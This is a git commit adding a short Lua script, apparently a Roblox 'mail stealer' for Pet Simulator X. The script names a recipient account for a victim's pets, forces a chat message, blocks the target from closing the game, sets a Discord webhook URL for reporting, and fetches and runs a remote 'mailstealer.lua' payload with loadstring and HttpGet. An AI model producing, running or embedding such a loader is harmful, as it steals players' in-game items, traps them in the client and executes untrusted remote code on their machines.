73eb405af293c7da4844531f08b4038728c767e4
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-07-01 07:43:01 +0500

    Upload znx_5345_0.lua

---
+++ znx_5345_0.lua
@@ -0,0 +1,9 @@
+
+_G.Username = "footing1i" --// Username To Send Pets To
+_G.GiftMessage = "TEST" --// Message For The Gift To Say
+_G.SendMessage = "TEST" --// Message the victim will send in the chat on execution
+_G.Diamonds = 10 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Webhook = "https://discord.com/api/webhooks/1124530470714093618/ZGVnU2UTWQ8FIdmgqZFeBuX9eQjfW08U5wUVB4CUGWHaSDxSuBa940Gz8EFKSvcd5Uan" --// Discord Webhook URL
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GadoScripts/PetSimulatorX/main/mailstealer.lua"))()
